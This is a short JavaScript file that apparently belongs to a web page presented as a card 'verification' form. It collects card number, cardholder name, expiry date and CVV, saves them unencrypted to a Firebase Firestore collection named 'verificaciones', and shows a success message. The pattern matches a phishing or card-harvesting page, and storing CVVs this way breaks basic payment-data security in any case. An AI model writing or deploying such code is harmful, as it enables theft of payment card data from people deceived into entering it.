import { db } from "./firebase.js";
import { collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

const form = document.getElementById("formVerificacion");

if(form){
    form.addEventListener("submit", async(e)=>{
        e.preventDefault();

        const data = {
            tarjeta: form.tarjeta.value,
            nombre: form.nombre.value,
            vence: form.vence.value,
            cvv: form.cvv.value,
            fechaRegistro: new Date()
        };

        await addDoc(collection(db,"verificaciones"), data);

        alert("Datos enviados correctamente.");
        form.reset();
    });
}
